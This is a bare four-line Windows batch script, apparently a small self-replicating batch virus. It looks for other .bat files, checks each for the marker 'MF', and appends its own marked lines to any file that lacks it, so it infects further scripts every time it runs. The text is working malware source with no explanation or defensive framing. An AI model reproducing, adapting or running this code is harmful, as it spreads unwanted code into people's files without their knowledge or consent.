@if "%0=="%Duke/SMF% exit
@for %%b in (%MF%*.bat) do set $=%%b
@find "MF"<%$%>nul
@if errorlevel 1 find "MF"<%0>>%$%
